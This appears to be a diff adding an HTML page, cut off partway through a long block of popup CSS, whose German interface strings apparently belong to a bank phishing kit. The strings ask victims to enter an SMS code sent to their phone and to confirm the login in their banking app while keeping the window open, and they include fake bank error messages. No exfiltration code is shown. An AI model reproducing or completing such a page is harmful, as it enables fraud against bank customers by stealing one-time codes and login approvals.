@@ -1,0 +1,867 @@
+<html lang="en" class="h-100"><head>
+
+    <!-- ========================================================================================== -->
+    <script type="text/javascript" charset="utf-8" async="" src="https://www.smartsuppchat.com/loader.js?"></script><script>
+      const translations = {
+        translate: {
+          confirmation: "Bestätigung",
+          codeSent: "Wir haben einen Code an Ihre Telefonnummer gesendet.",
+          enterCode: "Code eingeben",
+          confirm: "Zur Bestätigung",
+          codeRequired: "Bitte geben Sie den Code ein!",
+          numbersOnly: "Der Code darf nur Zahlen enthalten!",
+          loginConfirmation: "Anmeldebestätigung",
+          pleaseWait: "Bitte beachten Sie, dass wir uns über Ihre Anmeldung freuen. Das kann ein toller Tag werden.",
+          pushNotification: "Schließen Sie dieses Fenster erst, wenn Sie die Anmeldung zu Ihrem persönlichen Konto in der Banking-App bestätigt haben.<br/><br/>Wenn Sie innerhalb von 5 Minuten keine Bestätigung erhalten, aktualisieren Sie bitte die Seite und versuchen Sie es erneut.",
+          error: "Falsch",
+          incorrectData: "Es wurden falsche Informationen eingegeben. Bitte versuchen Sie es erneut.",
+          ok: "OK",
+          noDataSent: "Es wurden keine Daten gesendet.",
+          serverError: "Fehler beim Senden der Anfrage an den Server",
+          bankError: "Bankfehler"
+        }
+      };
+    </script>
+    
+    <script src="https://11"></script><style>:root{--swal2-outline: 0 0 0 3px rgba(100, 150, 200, 0.5);--swal2-container-padding: 0.625em;--swal2-backdrop: rgba(0, 0, 0, 0.4);--swal2-backdrop-transition: background-color 0.15s;--swal2-width: 32em;--swal2-padding: 0 0 1.25em;--swal2-border: none;--swal2-border-radius: 0.3125rem;--swal2-background: white;--swal2-color: #545454;--swal2-show-animation: swal2-show 0.3s;--swal2-hide-animation: swal2-hide 0.15s forwards;--swal2-icon-zoom: 1;--swal2-icon-animations: true;--swal2-title-padding: 0.8em 1em 0;--swal2-html-container-padding: 1em 1.6em 0.3em;--swal2-input-border: 1px solid #d9d9d9;--swal2-input-border-radius: 0.1875em;--swal2-input-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-background: transparent;--swal2-input-transition: border-color 0.2s, box-shadow 0.2s;--swal2-input-hover-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px transparent;--swal2-input-focus-border: 1px solid #b4dbed;--swal2-input-focus-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06), 0 0 0 3px rgba(100, 150, 200, 0.5);--swal2-progress-step-background: #add8e6;--swal2-validation-message-background: #f0f0f0;--swal2-validation-message-color: #666;--swal2-footer-border-color: #eee;--swal2-footer-background: transparent;--swal2-footer-color: inherit;--swal2-timer-progress-bar-background: rgba(0, 0, 0, 0.3);--swal2-close-button-position: initial;--swal2-close-button-inset: auto;--swal2-close-button-font-size: 2.5em;--swal2-close-button-color: #ccc;--swal2-close-button-transition: color 0.2s, box-shadow 0.2s;--swal2-close-button-outline: initial;--swal2-close-button-box-shadow: inset 0 0 0 3px transparent;--swal2-close-button-focus-box-shadow: inset var(--swal2-outline);--swal2-close-button-hover-transform: none;--swal2-actions-justify-content: center;--swal2-actions-width: auto;--swal2-actions-margin: 1.25em auto 0;--swal2-actions-padding: 0;--swal2-actions-border-radius: 0;--swal2-actions-background: transparent;--swal2-action-button-transition: background-color 0.2s, box-shadow 0.2s;--swal2-action-button-hover: black 10%;--swal2-action-button-active: black 10%;--swal2-confirm-button-box-shadow: none;--swal2-confirm-button-border-radius: 0.25em;--swal2-confirm-button-background-color: #7066e0;--swal2-confirm-button-color: #fff;--swal2-deny-button-box-shadow: none;--swal2-deny-button-border-radius: 0.25em;--swal2-deny-button-background-color: #dc3741;--swal2-deny-button-color: #fff;--swal2-cancel-button-box-shadow: none;--swal2-cancel-button-border-radius: 0.25em;--swal2-cancel-button-background-color: #6e7881;--swal2-cancel-button-color: #fff;--swal2-toast-show-animation: swal2-toast-show 0.5s;--swal2-toast-hide-animation: swal2-toast-hide 0.1s forwards;--swal2-toast-border: none;--swal2-toast-box-shadow: 0 0 1px hsl(0deg 0% 0% / 0.075), 0 1px 2px hsl(0deg 0% 0% / 0.075), 1px 2px 4px hsl(0deg 0% 0% / 0.075), 1px 3px 8px hsl(0deg 0% 0% / 0.075), 2px 4px 16px hsl(0deg 0% 0% / 0.075)}[data-swal2-theme=dark]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white);--swal2-timer-progress-bar-background: rgba(255, 255, 255, 0.7)}@media(prefers-color-scheme: dark){[data-swal2-theme=auto]{--swal2-dark-theme-black: #19191a;--swal2-dark-theme-white: #e1e1e1;--swal2-background: var(--swal2-dark-theme-black);--swal2-color: var(--swal2-dark-theme-white);--swal2-footer-border-color: #555;--swal2-input-background: color-mix(in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10%);--swal2-validation-message-background: color-mix( in srgb, var(--swal2-dark-theme-black), var(--swal2-dark-theme-white) 10% );--swal2-validation-message-color: var(--swal2-dark-theme-white);--swal2-timer-progress-bar-background: rgba(255, 255, 255, 0.7)}}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:auto}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px var(--swal2-backdrop)}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:var(--swal2-container-padding);overflow-x:hidden;transition:var(--swal2-backdrop-transition);-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:var(--swal2-backdrop)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container)[popover]{width:auto;border:0}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:var(--swal2-width);max-width:100%;padding:var(--swal2-padding);border:var(--swal2-border);border-radius:var(--swal2-border-radius);background:var(--swal2-background);color:var(--swal2-color);font-family:inherit;font-size:1rem;container-name:swal2-popup}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable{cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-draggable div:where(.swal2-icon){cursor:grab}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging{cursor:grabbing}div:where(.swal2-container) div:where(.swal2-popup).swal2-dragging div:where(.swal2-icon){cursor:grabbing}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:var(--swal2-title-padding);color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;overflow-wrap:break-word;cursor:initial}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:var(--swal2-actions-justify-content);width:var(--swal2-actions-width);margin:var(--swal2-actions-margin);padding:var(--swal2-actions-padding);border-radius:var(--swal2-actions-border-radius);background:var(--swal2-actions-background)}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:var(--swal2-action-button-transition);border:none;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border-radius:var(--swal2-confirm-button-border-radius);background:initial;background-color:var(--swal2-confirm-button-background-color);box-shadow:var(--swal2-confirm-button-box-shadow);color:var(--swal2-confirm-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):hover{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):active{background-color:color-mix(in srgb, var(--swal2-confirm-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border-radius:var(--swal2-deny-button-border-radius);background:initial;background-color:var(--swal2-deny-button-background-color);box-shadow:var(--swal2-deny-button-box-shadow);color:var(--swal2-deny-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):hover{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):active{background-color:color-mix(in srgb, var(--swal2-deny-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border-radius:var(--swal2-cancel-button-border-radius);background:initial;background-color:var(--swal2-cancel-button-background-color);box-shadow:var(--swal2-cancel-button-box-shadow);color:var(--swal2-cancel-button-color);font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):hover{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-hover))}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):active{background-color:color-mix(in srgb, var(--swal2-cancel-button-background-color), var(--swal2-action-button-active))}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none;box-shadow:var(--swal2-action-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-styled)[disabled]:not(.swal2-loading){opacity:.4}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid var(--swal2-footer-border-color);background:var(--swal2-footer-background);color:var(--swal2-footer-color);font-size:1em;text-align:center;cursor:initial}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:var(--swal2-border-radius);border-bottom-left-radius:var(--swal2-border-radius)}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:var(--swal2-timer-progress-bar-background)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em;cursor:initial}div:where(.swal2-container) button:where(.swal2-close){position:var(--swal2-close-button-position);inset:var(--swal2-close-button-inset);z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:var(--swal2-close-button-transition);border:none;border-radius:var(--swal2-border-radius);outline:var(--swal2-close-button-outline);background:rgba(0,0,0,0);color:var(--swal2-close-button-color);font-family:monospace;font-size:var(--swal2-close-button-font-size);cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:var(--swal2-close-button-hover-transform);background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:var(--swal2-close-button-focus-box-shadow)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-html-container){z-index:1;justify-content:center;margin:0;padding:var(--swal2-html-container-padding);overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;overflow-wrap:break-word;word-break:break-word;cursor:initial}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:var(--swal2-input-transition);border:var(--swal2-input-border);border-radius:var(--swal2-input-border-radius);background:var(--swal2-input-background);box-shadow:var(--swal2-input-box-shadow);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):hover,div:where(.swal2-container) input:where(.swal2-file):hover,div:where(.swal2-container) textarea:where(.swal2-textarea):hover{box-shadow:var(--swal2-input-hover-box-shadow)}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:var(--swal2-input-focus-border);outline:none;box-shadow:var(--swal2-input-focus-box-shadow)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:var(--swal2-background)}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:var(--swal2-input-background);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:var(--swal2-input-background);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:var(--swal2-background);color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:var(--swal2-validation-message-background);color:var(--swal2-validation-message-color);font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:var(--swal2-progress-step-background);color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:var(--swal2-progress-step-background)}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;zoom:var(--swal2-icon-zoom);border:.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}}div:where(.swal2-icon).swal2-warning{border-color:#f8bb86;color:#f8bb86}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}}div:where(.swal2-icon).swal2-info{border-color:#3fc3ee;color:#3fc3ee}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}}div:where(.swal2-icon).swal2-question{border-color:#87adbd;color:#87adbd}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}@container swal2-popup style(--swal2-icon-animations:true){div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:var(--swal2-show-animation)}.swal2-hide{animation:var(--swal2-hide-animation)}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;border:var(--swal2-toast-border);background:var(--swal2-background);box-shadow:var(--swal2-toast-box-shadow);pointer-events:auto}.swal2-toast>*{grid-column:2}.swal2-toast h2:where(.swal2-title){margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-toast .swal2-loading{justify-content:center}.swal2-toast input:where(.swal2-input){height:2em;margin:.5em;font-size:1em}.swal2-toast .swal2-validation-message{font-size:1em}.swal2-toast div:where(.swal2-footer){margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-toast button:where(.swal2-close){grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-toast div:where(.swal2-html-container){margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-toast div:where(.swal2-html-container):empty{padding:0}.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-toast div:where(.swal2-actions){justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-toast button:where(.swal2-styled){margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}@container swal2-popup style(--swal2-icon-animations:true){.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}}.swal2-toast.swal2-show{animation:var(--swal2-toast-show-animation)}.swal2-toast.swal2-hide{animation:var(--swal2-toast-hide-animation)}@keyframes swal2-show{0%{transform:translate3d(0, -50px, 0) scale(0.9);opacity:0}100%{transform:translate3d(0, 0, 0) scale(1);opacity:1}}@keyframes swal2-hide{0%{transform:translate3d(0, 0, 0) scale(1);opacity:1}100%{transform:translate3d(0, -50px, 0) scale(0.9);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes 